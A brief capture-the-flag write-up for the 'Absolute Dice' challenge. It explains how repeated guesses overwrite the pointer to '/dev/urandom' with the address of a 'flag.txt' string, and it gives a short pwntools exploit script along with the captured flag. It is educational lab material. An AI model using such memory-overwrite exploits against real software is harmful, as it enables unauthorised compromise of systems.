# Absolute Dice

After some amount of guesses the value would inevitable overwrite
the address to the string "/dev/urandom" with the guess you made,
So until then: waste your moves by guessing random stuff and then
sending the address to the conveniently placed "flag.txt" string
at 0x8048bb9. Then the random source is static and we can just win
by gussing the same number over and over... Or until we overwrite
the number of hits we have with our input.

```py
io = start()
for i in range(31):
    io.recvuntil(b"guess> ")
    io.sendline(str(0x41414141).encode())
io.recvuntil(b"guess> ")
io.sendline(str(0x8048bb9).encode())
for i in range(31):
    io.recvuntil(b"guess> ")
    io.sendline(b"11")
io.interactive()
```

`ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}`
